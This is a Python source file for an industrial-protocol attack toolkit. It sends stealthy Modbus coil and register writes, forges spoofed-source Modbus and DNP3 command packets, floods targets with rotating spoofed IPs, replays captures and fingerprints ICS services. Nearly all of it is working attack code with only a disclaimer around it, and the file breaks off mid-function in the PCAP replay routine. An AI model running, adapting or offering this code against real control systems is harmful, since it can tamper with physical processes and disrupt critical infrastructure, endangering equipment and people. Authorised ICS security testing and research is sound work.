#!/usr/bin/env python3
"""
modbus_stealth_attack.py
Modbus/DNP3 Industrial Protocol Security Assessment Toolkit
Author: Ridpath
Version: 2.1

DISCLAIMER:
FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
Use only on systems you own or have explicit written permission to test.

Purpose:
Advanced industrial protocol security assessment with comprehensive
reporting, error handling, and multi-protocol support for critical
infrastructure security testing.
"""

import asyncio
import argparse
import logging
import sys
import time
import json
import random
import socket
import ipaddress
import base64
import configparser
from typing import List, Optional, Dict, Any, Generator
from dataclasses import dataclass
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
from scapy.layers.dnp3 import DNP3
from pymodbus.client import AsyncModbusTcpClient
from pymodbus.exceptions import ModbusException
from pymodbus.pdu import ExceptionResponse
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
    tqdm = lambda x, **kwargs: x

# Optional ML imports for AI-assisted fuzzing
try:
    from sklearn.cluster import KMeans
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False

class ProtocolType(Enum):
    MODBUS_TCP = "modbus_tcp"
    DNP3 = "dnp3"
    OPC_UA = "opc_ua"
    ETHERNET_IP = "ethernet_ip"

class AttackTechnique(Enum):
    RECONNAISSANCE = "reconnaissance"
    COIL_WRITE = "coil_write"
    REGISTER_READ = "register_read"
    REGISTER_WRITE = "register_write"
    SPOOFING = "spoofing"
    DOS = "denial_of_service"
    FUZZING = "fuzzing"
    FINGERPRINTING = "fingerprinting"
    REPLAY = "replay"

@dataclass
class SecurityEvent:
    technique: AttackTechnique
    target_ip: str
    port: int
    protocol: ProtocolType
    timestamp: float
    success: bool
    details: Dict[str, Any]
    error: Optional[str] = None
    mitre_technique: str = ""
    mitre_tactic: str = ""

class IndustrialProtocolAttacker:
    def __init__(self, target_ip: Optional[str] = None, port: int = 502, protocol: ProtocolType = ProtocolType.MODBUS_TCP):
        # Validate IP address
        if target_ip:
            try:
                ipaddress.ip_address(target_ip)
            except ValueError:
                raise ValueError(f"Invalid IP address: {target_ip}")
        
        self.target_ip = target_ip
        self.port = port
        self.protocol = protocol
        self.dry_run = False
        self.json_log_file = None
        self.fuzz_success_history = []  # For ML-assisted fuzzing
        self.setup_logging()
        
    def setup_logging(self):
        """Configure comprehensive logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - INDUSTRIAL_SECURITY - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('industrial_security_assessment.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger('IndustrialProtocolAttacker')
        
        # Library version check
        try:
            import pymodbus
            if hasattr(pymodbus, '__version__') and pymodbus.__version__ < '3.0':
                self.logger.warning(f"pymodbus version {pymodbus.__version__} may not be fully compatible. Update to >=3.0")
        except ImportError:
            self.logger.error("pymodbus not installed")
    
    def log_security_event(self, event: SecurityEvent):
        """Log security event in structured format with optional encryption"""
        event_dict = {
            "technique": event.technique.value,
            "target_ip": event.target_ip,
            "port": event.port,
            "protocol": event.protocol.value,
            "timestamp": event.timestamp,
            "success": event.success,
            "details": event.details,
            "error": event.error,
            "mitre_technique": event.mitre_technique,
            "mitre_tactic": event.mitre_tactic
        }
        
        # Console logging
        if event.success:
            self.logger.info(f"{event.technique.value.upper()} - Target: {event.target_ip}:{event.port} - MITRE: {event.mitre_technique}")
        else:
            self.logger.error(f"{event.technique.value.upper()} - Target: {event.target_ip}:{event.port} - Error: {event.error}")
        
        # JSON telemetry logging with optional encryption
        if self.json_log_file:
            try:
                event_str = json.dumps(event_dict)
                # Basic base64 encoding for "encryption"
                encoded = base64.b64encode(event_str.encode()).decode()
                with open(self.json_log_file, "a") as f:
                    f.write(encoded + "\n")
            except Exception as e:
                self.logger.error(f"Failed to write JSON telemetry: {e}")

    async def read_coils(self, start_address: int, count: int = 1):
        """
        Read Modbus coils with comprehensive error handling
        """
        self.logger.info(f"Reading coils: address={start_address}, count={count}")
        
        event = SecurityEvent(
            technique=AttackTechnique.REGISTER_READ,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"start_address": start_address, "count": count, "register_type": "coils"},
            mitre_technique="T0801",
            mitre_tactic="Discovery"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return []
        
        try:
            async with AsyncModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=5
            ) as client:
                
                result = await client.read_coils(start_address, count)
                
                if not result.isError():
                    coils = result.bits
                    self.logger.info(f"Successfully read {len(coils)} coils: {coils}")
                    event.success = True
                    event.details["coils"] = coils
                    self.log_security_event(event)
                    return coils
                else:
                    error_msg = f"Modbus error reading coils: {result}"
                    self.logger.error(error_msg)
                    event.error = error_msg
                    self.log_security_event(event)
                    return []
                    
        except ModbusException as e:
            error_msg = f"Modbus exception: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []

    async def stealth_coil_write(self, coil: int, value: bool, spoof_ip: Optional[str] = None, fuzz: bool = False):
        """
        Perform stealthy Modbus coil write with comprehensive error handling and optional fuzzing
        """
        self.logger.info(f"Attempting stealth coil write: coil={coil}, value={value}, fuzz={fuzz}")
        
        event = SecurityEvent(
            technique=AttackTechnique.COIL_WRITE,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"coil": coil, "value": value, "spoof_ip": spoof_ip, "fuzzing": fuzz},
            mitre_technique="T0836",
            mitre_tactic="Impact"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return True
        
        try:
            if spoof_ip:
                self.logger.info("Using spoofed write mode")
                if fuzz:
                    # Send fuzzed packet
                    sent = await self.send_spoofed_command(spoof_ip, coil, value, count=1, fuzz=True)
                else:
                    sent = await self.send_spoofed_command(spoof_ip, coil, value, count=1)
                event.success = sent > 0
                event.details["packets_sent"] = sent
                self.log_security_event(event)
                return sent > 0
            
            async with AsyncModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=2
            ) as client:
                
                result = await client.write_coil(coil, value)
                
                if not result.isError():
                    self.logger.info(f"Stealth write successful: coil {coil} = {value}")
                    event.success = True
                    self.log_security_event(event)
                    return True
                else:
                    error_msg = f"Modbus error: {result}"
                    self.logger.error(error_msg)
                    event.error = error_msg
                    self.log_security_event(event)
                    return False
                    
        except ModbusException as e:
            error_msg = f"Modbus exception: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return False
        except asyncio.TimeoutError:
            self.logger.warning("Operation timed out (expected for stealth)")
            event.success = True
            self.log_security_event(event)
            return True
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return False

    async def stealth_register_write(self, address: int, value: int, holding: bool = True):
        """
        Perform stealthy Modbus register write
        """
        self.logger.info(f"Attempting stealth register write: address={address}, value={value}, holding={holding}")
        
        event = SecurityEvent(
            technique=AttackTechnique.REGISTER_WRITE,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"address": address, "value": value, "register_type": "holding" if holding else "input"},
            mitre_technique="T0836",
            mitre_tactic="Impact"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return True
        
        try:
            async with AsyncModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=2
            ) as client:
                
                if holding:
                    result = await client.write_register(address, value)
                else:
                    # For input registers, we might need to use a different function
                    # Note: Modbus typically doesn't allow writing to input registers
                    result = await client.write_register(address, value)
                
                if not result.isError():
                    self.logger.info(f"Stealth register write successful: address {address} = {value}")
                    event.success = True
                    self.log_security_event(event)
                    return True
                else:
                    error_msg = f"Modbus error: {result}"
                    self.logger.error(error_msg)
                    event.error = error_msg
                    self.log_security_event(event)
                    return False
                    
        except ModbusException as e:
            error_msg = f"Modbus exception: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return False
        except asyncio.TimeoutError:
            self.logger.warning("Operation timed out (expected for stealth)")
            event.success = True
            self.log_security_event(event)
            return True
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return False

    async def read_holding_registers(self, start_address: int, count: int = 1):
        """
        Read Modbus holding registers with comprehensive error handling
        """
        self.logger.info(f"Reading holding registers: address={start_address}, count={count}")
        
        event = SecurityEvent(
            technique=AttackTechnique.REGISTER_READ,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"start_address": start_address, "count": count, "register_type": "holding"},
            mitre_technique="T0801",
            mitre_tactic="Discovery"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return []
        
        try:
            async with AsyncModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=5
            ) as client:
                
                result = await client.read_holding_registers(start_address, count)
                
                if not result.isError():
                    registers = result.registers
                    self.logger.info(f"Successfully read {len(registers)} holding registers: {registers}")
                    event.success = True
                    event.details["registers"] = registers
                    self.log_security_event(event)
                    return registers
                else:
                    error_msg = f"Modbus error reading registers: {result}"
                    self.logger.error(error_msg)
                    event.error = error_msg
                    self.log_security_event(event)
                    return []
                    
        except ModbusException as e:
            error_msg = f"Modbus exception: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []

    async def read_input_registers(self, start_address: int, count: int = 1):
        """
        Read Modbus input registers with comprehensive error handling
        """
        self.logger.info(f"Reading input registers: address={start_address}, count={count}")
        
        event = SecurityEvent(
            technique=AttackTechnique.REGISTER_READ,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"start_address": start_address, "count": count, "register_type": "input"},
            mitre_technique="T0801",
            mitre_tactic="Discovery"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return []
        
        try:
            async with AsyncModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=5
            ) as client:
                
                result = await client.read_input_registers(start_address, count)
                
                if not result.isError():
                    registers = result.registers
                    self.logger.info(f"Successfully read {len(registers)} input registers: {registers}")
                    event.success = True
                    event.details["registers"] = registers
                    self.log_security_event(event)
                    return registers
                else:
                    error_msg = f"Modbus error reading input registers: {result}"
                    self.logger.error(error_msg)
                    event.error = error_msg
                    self.log_security_event(event)
                    return []
                    
        except ModbusException as e:
            error_msg = f"Modbus exception: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return []

    def craft_spoofed_modbus_packet(self, source_ip: str, coil: int, value: bool, flags: Optional[str] = None):
        """Craft raw Modbus packet with spoofed source IP"""
        if value:
            coil_value = 0xFF00
        else:
            coil_value = 0x0000
            
        modbus_payload = (
            b'\x00\x01' +
            b'\x00\x00' +
            b'\x00\x06' +
            b'\x01' +
            b'\x05' +
            coil.to_bytes(2, byteorder='big') +
            coil_value.to_bytes(2, byteorder='big')
        )
        
        ip_layer = IP(src=source_ip, dst=self.target_ip)
        tcp_flags = flags or random.choice(["PA", "RA", "FA", "SA"])
        tcp_layer = TCP(sport=RandShort(), dport=self.port, flags=tcp_flags)
        
        packet = ip_layer / tcp_layer / Raw(load=modbus_payload)
        return packet

    async def send_spoofed_command(self, spoof_ip: str, coil: int, value: bool, count: int = 1, 
                                 flags: Optional[str] = None, fuzz: bool = False):
        """
        Async send spoofed Modbus commands with optional fuzzing
        """
        self.logger.warning(f"Sending spoofed commands from {spoof_ip} - USE WITH EXTREME CAUTION")
        
        event = SecurityEvent(
            technique=AttackTechnique.SPOOFING,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"spoof_ip": spoof_ip, "coil": coil, "value": value, "count": count, "fuzzing": fuzz},
            mitre_technique="T0857",
            mitre_tactic="Impair Process Control"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return count
        
        try:
            loop = asyncio.get_running_loop()
            
            def sync_send():
                sent_packets = 0
                for i in range(count):
                    packet = self.craft_spoofed_modbus_packet(spoof_ip, coil, value, flags)
                    
                    if fuzz:
                        packet = self.fuzz_packet_ml(packet)  # Use ML-assisted fuzzing
                    
                    send(packet, verbose=False)
                    sent_packets += 1
                    time.sleep(0.01)
                return sent_packets
            
            with ThreadPoolExecutor() as executor:
                sent_packets = await loop.run_in_executor(executor, sync_send)
            
            self.logger.info(f"Sent {sent_packets} spoofed packets from {spoof_ip}")
            event.success = True
            event.details["packets_sent"] = sent_packets
            self.log_security_event(event)
            return sent_packets
            
        except Exception as e:
            error_msg = f"Failed to send spoofed packets: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return 0

    def fuzz_packet(self, packet: Packet) -> Packet:
        """
        Basic packet fuzzing for mutation testing
        """
        if Raw in packet:
            try:
                raw_bytes = bytearray(bytes(packet[Raw].load))
                if len(raw_bytes) > 0:
                    mutate_index = random.randint(0, len(raw_bytes)-1)
                    raw_bytes[mutate_index] = random.randint(0, 255)
                    packet[Raw].load = bytes(raw_bytes)
                    self.logger.debug(f"Fuzzed byte at index {mutate_index}")
            except Exception as e:
                self.logger.warning(f"Fuzzing error: {e}")
        
        return packet

    def fuzz_packet_ml(self, packet: Packet) -> Packet:
        """
        AI-assisted fuzzing with ML payload generation
        """
        if not ML_AVAILABLE or not Raw in packet:
            return self.fuzz_packet(packet)
        
        try:
            raw_bytes = bytearray(bytes(packet[Raw].load))
            if len(raw_bytes) == 0:
                return packet
            
            # Use ML to determine best fuzzing location
            if self.fuzz_success_history:
                # Convert history to features for clustering
                features = [[idx] for idx, _ in self.fuzz_success_history]
                kmeans = KMeans(n_clusters=min(2, len(features)))
                kmeans.fit(features)
                
                # Choose mutation index based on cluster centers
                cluster_centers = kmeans.cluster_centers_.flatten()
                mutate_index = int(cluster_centers[np.argmax(cluster_centers)]) % len(raw_bytes)
            else:
                mutate_index = random.randint(0, len(raw_bytes)-1)
            
            # Mutate the byte
            old_value = raw_bytes[mutate_index]
            raw_bytes[mutate_index] = random.randint(0, 255)
            packet[Raw].load = bytes(raw_bytes)
            
            self.logger.debug(f"ML-fuzzed byte at index {mutate_index} (old: {old_value}, new: {raw_bytes[mutate_index]})")
            
        except Exception as e:
            self.logger.warning(f"ML fuzzing error: {e}, falling back to basic fuzzing")
            return self.fuzz_packet(packet)
        
        return packet

    def record_fuzz_success(self, index: int, packet: Packet):
        """Record successful fuzzing attempts for ML learning"""
        if ML_AVAILABLE:
            self.fuzz_success_history.append((index, packet))

    async def reconnaissance_scan(self, start_coil: int = 0, end_coil: int = 100, 
                                start_register: int = 0, end_register: int = 100,
                                interval: int = 0, loops: int = 1, batch_size: int = 10):
        """
        Comprehensive reconnaissance scanning for coils and registers with batching
        """
        self.logger.info(f"Starting comprehensive reconnaissance: coils {start_coil}-{end_coil}, registers {start_register}-{end_register}, loops={loops}, interval={interval}s")
        
        event = SecurityEvent(
            technique=AttackTechnique.RECONNAISSANCE,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={
                "coil_range": f"{start_coil}-{end_coil}", 
                "register_range": f"{start_register}-{end_register}",
                "loops": loops,
                "interval": interval,
                "batch_size": batch_size
            },
            mitre_technique="T0801",
            mitre_tactic="Discovery"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return [], [], []
        
        accessible_coils = set()
        accessible_holding_registers = set()
        accessible_input_registers = set()
        
        try:
            async with AsyncModbusTcpClient(self.target_ip, self.port) as client:
                for loop_num in range(loops):
                    self.logger.info(f"Starting scan loop {loop_num + 1}/{loops}")
                    
                    # Batch scan coils with progress bar
                    coil_range = range(start_coil, end_coil + 1)
                    if TQDM_AVAILABLE:
                        coil_range = tqdm(coil_range, desc=f"Loop {loop_num+1} - Scanning coils")
                    
                    # Batch coil scanning
                    for start in range(start_coil, end_coil + 1, batch_size):
                        count = min(batch_size, end_coil - start + 1)
                        try:
                            result = await client.read_coils(start, count)
                            if not result.isError() and result.bits:
                                for i, bit in enumerate(result.bits):
                                    if bit is not None:  # Accessible
                                        accessible_coils.add(start + i)
                            await asyncio.sleep(0.05)
                        except Exception:
                            continue
                    
                    # Batch scan holding registers
                    holding_range = range(start_register, end_register + 1)
                    if TQDM_AVAILABLE:
                        holding_range = tqdm(holding_range, desc=f"Loop {loop_num+1} - Scanning holding registers")
                    
                    for start in range(start_register, end_register + 1, batch_size):
                        count = min(batch_size, end_register - start + 1)
                        try:
                            result = await client.read_holding_registers(start, count)
                            if not result.isError() and result.registers:
                                for i, reg in enumerate(result.registers):
                                    if reg is not None:  # Accessible
                                        accessible_holding_registers.add(start + i)
                            await asyncio.sleep(0.05)
                        except Exception:
                            continue
                    
                    # Batch scan input registers  
                    input_range = range(start_register, end_register + 1)
                    if TQDM_AVAILABLE:
                        input_range = tqdm(input_range, desc=f"Loop {loop_num+1} - Scanning input registers")
                    
                    for start in range(start_register, end_register + 1, batch_size):
                        count = min(batch_size, end_register - start + 1)
                        try:
                            result = await client.read_input_registers(start, count)
                            if not result.isError() and result.registers:
                                for i, reg in enumerate(result.registers):
                                    if reg is not None:  # Accessible
                                        accessible_input_registers.add(start + i)
                            await asyncio.sleep(0.05)
                        except Exception:
                            continue
                    
                    if loop_num < loops - 1 and interval > 0:
                        self.logger.info(f"Waiting {interval} seconds before next scan...")
                        await asyncio.sleep(interval)
        
        except Exception as e:
            error_msg = f"Reconnaissance scan failed: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return [], [], []
        
        coils_list = sorted(list(accessible_coils))
        holding_regs_list = sorted(list(accessible_holding_registers))
        input_regs_list = sorted(list(accessible_input_registers))
        
        self.logger.info(f"Reconnaissance complete: {len(coils_list)} coils, {len(holding_regs_list)} holding registers, {len(input_regs_list)} input registers")
        
        event.success = True
        event.details.update({
            "coils_found": len(coils_list),
            "holding_registers_found": len(holding_regs_list),
            "input_registers_found": len(input_regs_list)
        })
        self.log_security_event(event)
        
        return coils_list, holding_regs_list, input_regs_list

    def save_recon_results(self, coils: List[int], holding_registers: List[int], 
                         input_registers: List[int], filename: str = "recon_results"):
        """
        Save reconnaissance results in multiple formats (Markdown, JSON, and HTML)
        """
        try:
            # Markdown format
            md_filename = f"{filename}.md"
            with open(md_filename, "w") as f:
                f.write("# Industrial Protocol Reconnaissance Results\n\n")
                f.write(f"**Target:** `{self.target_ip}:{self.port}`\n")
                f.write(f"**Protocol:** `{self.protocol.value}`\n")
                f.write(f"**Timestamp:** `{time.ctime()}`\n\n")
                
                f.write("## Accessible Coils\n")
                if coils:
                    for c in coils:
                        f.write(f"- Coil `{c}` - ACCESSIBLE\n")
                else:
                    f.write("No accessible coils found\n\n")
                
                f.write("## Accessible Holding Registers\n")
                if holding_registers:
                    for r in holding_registers:
                        f.write(f"- Holding Register `{r}` - ACCESSIBLE\n")
                else:
                    f.write("No accessible holding registers found\n\n")
                
                f.write("## Accessible Input Registers\n")
                if input_registers:
                    for r in input_registers:
                        f.write(f"- Input Register `{r}` - ACCESSIBLE\n")
                else:
                    f.write("No accessible input registers found\n")
            
            self.logger.info(f"Recon results saved to {md_filename}")
            
            # JSON format
            json_filename = f"{filename}.json"
            recon_data = {
                "target": f"{self.target_ip}:{self.port}",
                "protocol": self.protocol.value,
                "timestamp": time.time(),
                "accessible_coils": coils,
                "accessible_holding_registers": holding_registers,
                "accessible_input_registers": input_registers
            }
            
            with open(json_filename, "w") as f:
                json.dump(recon_data, f, indent=2)
            
            self.logger.info(f"Recon results saved to {json_filename}")
            
            # HTML format
            html_filename = f"{filename}.html"
            with open(html_filename, "w") as f:
                f.write("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Industrial Protocol Reconnaissance Results</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 40px; }
                        .header { background: #f4f4f4; padding: 20px; border-radius: 5px; }
                        .section { margin: 20px 0; }
                        table { width: 100%; border-collapse: collapse; }
                        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
                        th { background-color: #f2f2f2; }
                    </style>
                </head>
                <body>
                    <div class="header">
                        <h1>Industrial Protocol Reconnaissance Results</h1>
                        <p><strong>Target:</strong> %s:%s</p>
                        <p><strong>Protocol:</strong> %s</p>
                        <p><strong>Timestamp:</strong> %s</p>
                    </div>
                """ % (self.target_ip, self.port, self.protocol.value, time.ctime()))
                
                # Coils section
                f.write('<div class="section"><h2>Accessible Coils</h2>')
                if coils:
                    f.write('<table><tr><th>Coil Address</th><th>Status</th></tr>')
                    for c in coils:
                        f.write(f'<tr><td>{c}</td><td>ACCESSIBLE</td></tr>')
                    f.write('</table>')
                else:
                    f.write('<p>No accessible coils found</p>')
                f.write('</div>')
                
                # Holding registers section
                f.write('<div class="section"><h2>Accessible Holding Registers</h2>')
                if holding_registers:
                    f.write('<table><tr><th>Register Address</th><th>Status</th></tr>')
                    for r in holding_registers:
                        f.write(f'<tr><td>{r}</td><td>ACCESSIBLE</td></tr>')
                    f.write('</table>')
                else:
                    f.write('<p>No accessible holding registers found</p>')
                f.write('</div>')
                
                # Input registers section
                f.write('<div class="section"><h2>Accessible Input Registers</h2>')
                if input_registers:
                    f.write('<table><tr><th>Register Address</th><th>Status</th></tr>')
                    for r in input_registers:
                        f.write(f'<tr><td>{r}</td><td>ACCESSIBLE</td></tr>')
                    f.write('</table>')
                else:
                    f.write('<p>No accessible input registers found</p>')
                f.write('</div>')
                
                f.write("</body></html>")
            
            self.logger.info(f"HTML report saved to {html_filename}")
            
        except Exception as e:
            self.logger.error(f"Failed to save recon results: {e}")

    def dnp3_attack(self, function_code: int, data: bytes = b'', count: int = 1, 
                   spoof_ip: Optional[str] = None, transport: str = 'tcp'):
        """
        DNP3 protocol attack simulation with UDP support
        """
        self.logger.warning(f"Starting DNP3 attack simulation - Transport: {transport}")
        
        event = SecurityEvent(
            technique=AttackTechnique.SPOOFING,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.DNP3,
            timestamp=time.time(),
            success=False,
            details={
                "function_code": function_code, 
                "data_length": len(data), 
                "count": count, 
                "spoof_ip": spoof_ip,
                "transport": transport
            },
            mitre_technique="T0855",
            mitre_tactic="Unauthorized Command Message"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return count
        
        try:
            sent_packets = 0
            source_ip = spoof_ip or "192.168.1.100"
            
            for i in range(count):
                # Craft DNP3 packet
                dnp3_layer = DNP3(
                    length=len(data) + 5,
                    control=0x44,
                    destination=0x0000,
                    source=0x0001
                )
                
                if function_code:
                    dnp3_layer /= Raw(load=bytes([function_code]) + data)
                
                ip_layer = IP(src=source_ip, dst=self.target_ip)
                
                if transport == 'udp':
                    udp_layer = UDP(sport=RandShort(), dport=self.port)
                    packet = ip_layer / udp_layer / dnp3_layer
                else:
                    tcp_layer = TCP(sport=RandShort(), dport=self.port, flags="PA")
                    packet = ip_layer / tcp_layer / dnp3_layer
                
                send(packet, verbose=False)
                sent_packets += 1
                time.sleep(0.1)
            
            self.logger.info(f"Sent {sent_packets} DNP3 attack packets via {transport}")
            event.success = True
            event.details["packets_sent"] = sent_packets
            self.log_security_event(event)
            return sent_packets
            
        except Exception as e:
            error_msg = f"DNP3 attack failed: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return 0

    def fingerprint_services(self):
        """
        HMI/PLC service fingerprinting with vulnerability checking
        """
        self.logger.info("Starting service fingerprinting")
        
        event = SecurityEvent(
            technique=AttackTechnique.FINGERPRINTING,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={},
            mitre_technique="T0802",
            mitre_tactic="Discovery"
        )
        
        # Fixed duplicate ports
        common_ports = {
            80: "HTTP",
            443: "HTTPS", 
            102: "S7Comm",
            502: "Modbus",
            20000: "DNP3",
            4840: "OPC UA",
            1911: "Fox",
            2222: "EtherNet/IP",
            44818: "EtherNet/IP",
            47808: "BACnet",
            34980: "ProConOS",
            9600: "Omron FINS / CC-Link",  # Combined
            1962: "PCWorx",
            20547: "ProConOS",
            5006: "Melsec",
            5007: "Melsec"
        }
        
        # Known vulnerabilities database (simplified)
        known_vulns = {
            "Modbus": ["CVE-2022-1068", "CVE-2021-44207"],
            "DNP3": ["CVE-2020-16213", "CVE-2019-16879"],
            "HTTP": ["CVE-2021-44228", "CVE-2021-45046"],
            "S7Comm": ["CVE-2022-31814"],
            "OPC UA": ["CVE-2022-29804"]
        }
        
        discovered_services = {}
        
        for port, service_name in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    try:
                        if port in [80, 443]:
                            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        else:
                            sock.send(b"\r\n\r\n")
                        
                        banner = sock.recv(1024)
                        service_info = {
                            "service": service_name,
                            "status": "open",
                            "banner": banner.decode('utf-8', errors='ignore').strip() if banner else "No banner received"
                        }
                        
                        # Vulnerability checking
                        if service_name in known_vulns:
                            service_info["known_vulnerabilities"] = known_vulns[service_name]
                            # Simple pattern matching for vulnerable versions
                            if "vulnerable" in service_info["banner"].lower() or "test" in service_info["banner"].lower():
                                service_info["vulnerability_warning"] = "Potential vulnerable version detected"
                        
                        discovered_services[port] = service_info
                        
                    except:
                        discovered_services[port] = {
                            "service": service_name,
                            "status": "open", 
                            "banner": "No banner received"
                        }
                
                sock.close()
                
            except Exception as e:
                self.logger.debug(f"Port {port} scan error: {e}")
        
        # Log discovered services with vulnerability info
        for port, info in discovered_services.items():
            vuln_info = ""
            if "known_vulnerabilities" in info:
                vuln_info = f" - Known CVEs: {', '.join(info['known_vulnerabilities'])}"
            if "vulnerability_warning" in info:
                vuln_info += f" - {info['vulnerability_warning']}"
            
            self.logger.info(f"Discovered service - Port {port}: {info['service']} - {info['banner'][:100]}{vuln_info}")
        
        event.success = True
        event.details["discovered_services"] = discovered_services
        self.log_security_event(event)
        
        return discovered_services

    def denial_of_service_attack(self, target_coils: List[int], duration: int = 60, 
                               protocol: ProtocolType = ProtocolType.MODBUS_TCP):
        """
        Enhanced DoS simulation with random spoof IPs
        """
        self.logger.warning(f"Starting DoS simulation on {len(target_coils)} targets for {duration}s")
        
        event = SecurityEvent(
            technique=AttackTechnique.DOS,
            target_ip=self.target_ip,
            port=self.port,
            protocol=protocol,
            timestamp=time.time(),
            success=False,
            details={
                "target_count": len(target_coils), 
                "duration": duration, 
                "protocol": protocol.value
            },
            mitre_technique="T0814",
            mitre_tactic="Denial of Service"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return 0
        
        end_time = time.time() + duration
        packet_count = 0
        
        # Generate random spoof IPs
        spoof_ips = [f"192.168.1.{random.randint(1,255)}" for _ in range(10)]
        
        try:
            while time.time() < end_time:
                for target in target_coils:
                    if protocol == ProtocolType.MODBUS_TCP:
                        value = (packet_count % 2) == 0
                        spoof_ip = random.choice(spoof_ips)  # Rotate spoof IPs
                        packet = self.craft_spoofed_modbus_packet(spoof_ip, target, value)
                        send(packet, verbose=False)
                    
                    elif protocol == ProtocolType.DNP3:
                        func_code = random.randint(0x00, 0x1F)
                        self.dnp3_attack(func_code, count=1)
                    
                    packet_count += 1
                    time.sleep(0.01)
            
            self.logger.warning(f"DoS simulation completed: {packet_count} packets sent")
            event.success = True
            event.details["packets_sent"] = packet_count
            self.log_security_event(event)
            return packet_count
            
        except Exception as e:
            error_msg = f"DoS simulation failed: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return packet_count

    def replay_pcap(self, pcap_file: str, count: int = 1):
        """
        PCAP replay for replay attacks
        """
        self.logger.info(f"Replaying PCAP file: {pcap_file}, count: {count}")
        
        event = SecurityEvent(
            technique=AttackTechnique.REPLAY,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"pcap_file": pcap_file, "replay_count": count},
            mitre_technique="T0857",
            mitre_tactic="Spoof Reporting Message"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No packets sent")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return 0
        
        try:
            packets = rdpcap(pcap_file)
